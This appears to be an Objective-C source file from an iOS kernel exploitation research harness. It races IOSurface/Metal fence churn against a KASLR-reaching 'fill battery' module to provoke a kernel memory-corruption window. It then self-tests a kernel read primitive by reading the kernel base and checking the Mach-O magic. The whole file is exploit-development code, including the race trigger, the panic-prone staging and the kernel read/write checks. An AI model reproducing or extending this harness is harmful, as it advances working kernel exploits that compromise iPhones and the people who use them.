//
//  P129FenceFill.m — fence churn x the ANE fill battery, concurrent. p129.
//  Lum1na-Debug (P007 rig). iOS kernel research (Lum1na).
//
//  Provenance: notes 288/289 + the p127/p128 falsifications. The grid:
//      p127  fence ALONE                       -> clean (3 x ~21k commits)
//      p128  fence x IOGPU-queue churn         -> clean (48k comm / 40k ops)
//      p129  fence x THE FILL ENGINE (this tap)
//  The 2/2 aborts at 0x984faf8 (range-check cluster 0x984fcc8) had the
//  fill-staging sids in x5 — the fill battery is the only remaining
//  historical co-driver. If THIS pair is clean too, the fence lane
//  demotes to "attested-only-when-fill-lives" and the corrupt-count
//  window moves to the ANE lane itself.
//
//  Shape: thread A = the p127 fence churn body (IOSurface-backed Metal
//  blits + surface recycle; the engine-driven fence teardown/drain/
//  append path) racing thread B = the REAL P044 fill battery invoked as
//  its one tap ([P044AksKaslrReach tap], serialized; its ember auto-arm
//  files on the device pick the mode). Thread A stops when B returns.
//  PANIC-POSSIBLE. One tap per force-quit. Honest stage-3 self-test tail.
//

#import "P129FenceFill.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "P007KreadLane.h"
#import "P007Board.h"
#import "LabBandit.h"
#import "P044AksKaslrReach.h"

#import <Metal/Metal.h>
#import <CoreFoundation/CoreFoundation.h>
#import <Foundation/Foundation.h>
#import <stdarg.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <pthread.h>
#import <stdatomic.h>
#import <stdint.h>
#import <stdio.h>
#import <string.h>
#import <stdlib.h>
#import <unistd.h>

#define P129_BUILD   @"p129-fencefill-v1"
#define P129_SURF_W  64
#define P129_SURF_H  64
#define P129_RECYCLE 8

typedef void *(*IOSurfaceCreate_t)(CFDictionaryRef);
typedef uint32_t (*IOSurfaceGetID_t)(void *);

static NSString *P129R(void);

static NSMutableString *g_buf;
static int g_fd = -1;
static void L(NSString *s) {
    if (!g_buf) return;
    NSString *out = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
    [g_buf appendString:out];
    if (g_fd >= 0) {
        const char *p = out.UTF8String;
        if (p) { (void)write(g_fd, p, strlen(p)); (void)fcntl(g_fd, F_FULLFSYNC); }
    }
}
static void Lf(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    L(line);
}

static atomic_int g_stop;
static atomic_ulong ga_rounds, ga_commits, ga_recycles, ga_fails;
static CFMutableDictionaryRef g_dict;
static IOSurfaceCreate_t  g_surfCreate;
static IOSurfaceGetID_t   g_surfID;

static void p129_law_dict(void) {
    CFMutableDictionaryRef d = CFDictionaryCreateMutable(
        kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks,
        &kCFTypeDictionaryValueCallBacks);
    int32_t w = P129_SURF_W, h = P129_SURF_H, bpe = 4,
            bpr = P129_SURF_W * 4, as = P129_SURF_W * P129_SURF_H * 4;
    CFNumberRef nw = CFNumberCreate(NULL, kCFNumberSInt32Type, &w);
    CFNumberRef nh = CFNumberCreate(NULL, kCFNumberSInt32Type, &h);
    CFNumberRef ne = CFNumberCreate(NULL, kCFNumberSInt32Type, &bpe);
    CFNumberRef nr = CFNumberCreate(NULL, kCFNumberSInt32Type, &bpr);
    CFNumberRef na = CFNumberCreate(NULL, kCFNumberSInt32Type, &as);
    CFDictionarySetValue(d, CFSTR("IOSurfaceWidth"), nw);
    CFDictionarySetValue(d, CFSTR("IOSurfaceHeight"), nh);
    CFDictionarySetValue(d, CFSTR("IOSurfaceBytesPerElement"), ne);
    CFDictionarySetValue(d, CFSTR("IOSurfaceBytesPerRow"), nr);
    CFDictionarySetValue(d, CFSTR("IOSurfaceAllocSize"), na);
    CFRelease(nw); CFRelease(nh); CFRelease(ne); CFRelease(nr); CFRelease(na);
    g_dict = d;
}

/* thread A: the p127/p128 fence churn body (with recycle) */
static void *p129_fencer(void *u) {
    (void)u;
    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
    if (!dev) { atomic_fetch_add(&ga_fails, 1); return NULL; }
    id<MTLCommandQueue> q = [dev newCommandQueue];
    if (!q) { atomic_fetch_add(&ga_fails, 1); return NULL; }
    MTLTextureDescriptor *td =
        [MTLTextureDescriptor texture2DDescriptorWithPixelFormat:
         MTLPixelFormatBGRA8Unorm width:P129_SURF_W height:P129_SURF_H
         mipmapped:NO];
    td.storageMode = MTLStorageModeShared;
    unsigned long r = 0;
    void *surfaces[2] = { NULL, NULL };
    id<MTLTexture> tex[2] = { NULL, NULL };
    while (!atomic_load(&g_stop)) {
        @autoreleasepool {
            if (r % P129_RECYCLE == 0) {
                for (int k = 0; k < 2; k++) {
                    if (tex[k]) tex[k] = NULL;
                    if (surfaces[k]) { CFRelease(surfaces[k]); surfaces[k] = NULL; }
                }
                for (int k = 0; k < 2; k++) {
                    void *s = g_surfCreate(g_dict);
                    if (!s) { atomic_fetch_add(&ga_fails, 1); continue; }
                    tex[k] = [dev newTextureWithDescriptor:td
                                                 iosurface:(IOSurfaceRef)s
                                                     plane:0];
                    surfaces[k] = s;
                    if (!tex[k]) atomic_fetch_add(&ga_fails, 1);
                }
                atomic_fetch_add(&ga_recycles, 1);
            }
            if (!tex[0] || !tex[1]) { r++;
              [NSThread sleepForTimeInterval:0.01]; continue; }
            id<MTLCommandBuffer> cb = [q commandBuffer];
            id<MTLBlitCommandEncoder> e = [cb blitCommandEncoder];
            [e copyFromTexture:tex[0] sourceSlice:0 sourceLevel:0
               sourceOrigin:MTLOriginMake(0,0,0)
               sourceSize:MTLSizeMake(P129_SURF_W, P129_SURF_H, 1)
               toTexture:tex[1] destinationSlice:0 destinationLevel:0
               destinationOrigin:MTLOriginMake(0,0,0)];
            [e endEncoding];
            [cb commit];
            [cb waitUntilCompleted];
            atomic_fetch_add(&ga_commits, 1);
            r++;
            atomic_store(&ga_rounds, r);
        }
    }
    for (int k = 0; k < 2; k++) {
        if (tex[k]) tex[k] = NULL;
        if (surfaces[k]) { CFRelease(surfaces[k]); surfaces[k] = NULL; }
    }
    return NULL;
}

static void p129_bandit(const char *outcome) {
    static const char *arms[1] = { "main" };
    LabBanditSeedRow sr = { "main", "ok", 0 };
    char attr[288];
    LabBanditRegister("p129", arms, 1, &sr, 0, "p129 auto-learn", "ok",
                      "survived", attr, sizeof attr);
    LabBanditRecord("p129", 0, outcome);
}

@implementation P129FenceFill

+ (NSString *)tap {
    g_buf = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    g_fd = open([[docs stringByAppendingPathComponent:@"p129_fencefill_log.txt"]
                 UTF8String], O_CREAT | O_TRUNC | O_WRONLY, 0644);

    Lf(@"=== p129 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P129_BUILD);
    Lf(@"%@", [LabDeviceProfile identBlock]);
    L(@"[law] the LAST co-driver cell: fence churn x the REAL P044 fill");
    L(@"  battery (thread B = [P044AksKaslrReach tap], serialized; its own");
    L(@"  log file stays p044's). p127/p128 = falsifications; the 2/2");
    L(@"  0x984fcc8 aborts carried fill-staging sids in x5.");
    L(@"  PANIC-POSSIBLE; one tap per force-quit; kread32 = the only gate.");

    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p129"];
    if (stop) { L(stop); p129_bandit("gated"); return P129R(); }

    void *iosf = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iosf) { L(@"[-] STOP dlopen"); p129_bandit("nodlopen"); return P129R(); }
    g_surfCreate = (IOSurfaceCreate_t)dlsym(iosf, "IOSurfaceCreate");
    g_surfID     = (IOSurfaceGetID_t)dlsym(iosf, "IOSurfaceGetID");
    if (!g_surfCreate || !g_surfID) {
        L(@"[-] STOP dlsym"); p129_bandit("nodlsym"); return P129R();
    }
    p129_law_dict();

    /* ---- thread A starts, then the fill battery fires ---- */
    L(@"--- stage 1: fence churn STARTS, then the fill battery fires ---");
    L(@"[IN FLIGHT] co-driver pair live - one tap per force-quit.");
    unsigned long c0 = atomic_load(&ga_commits), r0 = atomic_load(&ga_rounds);
    atomic_store(&g_stop, 0);
    pthread_t ta;
    pthread_create(&ta, NULL, p129_fencer, NULL);
    /* thread B: the real battery, serialized to one call */
    NSString *p044log = [P044AksKaslrReach tap];
    atomic_store(&g_stop, 1);
    pthread_join(ta, NULL);
    unsigned long c1 = atomic_load(&ga_commits), r1 = atomic_load(&ga_rounds);
    Lf(@"  battery done; fence churn during it: commits=%lu rounds=%lu "
       @"recycles=%lu fails=%lu survived=YES in-tap",
       c1 - c0, r1 - r0,
       (unsigned long)atomic_load(&ga_recycles),
       (unsigned long)atomic_load(&ga_fails));
    L(@"--- stage 2: the fill battery log (p044's own file unchanged) ---");
    if (p044log.length) {
        L(p044log.length > 8000
          ? [@"[p044 head/truncated]\n" stringByAppendingString:
             [p044log substringToIndex:8000]]
          : p044log);
    } else {
        L(@"  [p044 returned empty - honest note]");
    }

    /* ---- honest KRW self-test ---- */
    L(@"--- stage 3 KRW SELF-TEST (honest gate) ---");
    if (!P007LaneLive()) {
        L(@"  lane: CLOSED -> no receipt this tap. Honest.");
        p129_bandit("lane-closed");
    } else {
        uint64_t kb = P007LaneKbase();
        if (kb && P007LaneKRead32(kb) == 0xfeedfacfULL) {
            Lf(@"  KRW SELF-TEST READ: PASS (kbase=%#llx)", kb);
            p129_bandit("selftest-read-pass");
        } else {
            L(@"  KRW SELF-TEST READ: FAIL/HOLD");
            p129_bandit("selftest-read-fail");
        }
        Lf(@"  board: %@", [[P007Board shared] kreadSignal]);
    }
    L(@"  [read law] a post-tap 0x984fcc8-band panic = the append range");
    L(@"  cluster catching OUR co-driver pair = the corrupt-count window");
    L(@"  LIVE with the historical driver named.");
    Lf(@"=== p129 end %@ ===", LabLocalMilitaryNow());
    return P129R();
}

static NSString *P129R(void) { NSString *r = [g_buf copy]; g_buf = nil; return r; }

@end